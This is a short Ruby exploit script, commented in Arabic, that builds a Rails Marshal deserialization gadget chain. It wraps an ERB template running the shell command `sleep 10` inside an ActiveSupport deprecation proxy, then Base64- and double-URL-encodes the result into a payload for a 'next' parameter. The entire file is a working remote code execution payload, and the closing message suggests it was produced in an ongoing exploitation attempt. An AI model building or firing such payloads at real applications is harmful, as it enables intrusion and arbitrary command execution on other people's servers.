require 'base64'
require 'uri'

# هذه "gadget chain" مختلفة ومبسطة.
# نحن نستخدم كائنات Ruby القياسية فقط لتجنب الأخطاء.
# الفكرة هي خداع آلية تحميل القوالب (templates) لتنفيذ كود.

# 1. هذا هو الكائن الذي سيحمل الأمر الخبيث.
class ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
  def initialize(instance, method)
    @instance = instance
    @method = method
    @deprecator = ActiveSupport::Deprecation.new
  end
end

# 2. هذا هو الكائن الذي سينفذ الأمر.
class ERB
  def initialize(str)
    @src = str
  end
end

# 3. نقوم بتجميع الـ "gadget chain".
# نحن نطلب من ERB أن ينفذ أمر `sleep 10`.
erb_instance = ERB.new('<%= `sleep 10` %>')
# ثم نمرره إلى الكائن الوكيل.
proxy_instance = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb_instance, :result)

# تحويل الكائن النهائي إلى سلسلة Marshal
marshalled_payload = Marshal.dump(proxy_instance)

# تشفير السلسلة بـ Base64
base64_payload = Base64.strict_encode64(marshalled_payload)

# ترميز URL (مرتين)
final_payload = URI.encode_www_form_component(URI.encode_www_form_component(base64_payload))

puts "Your 3rd (and hopefully final) payload for the 'next' parameter is:"
puts final_payload
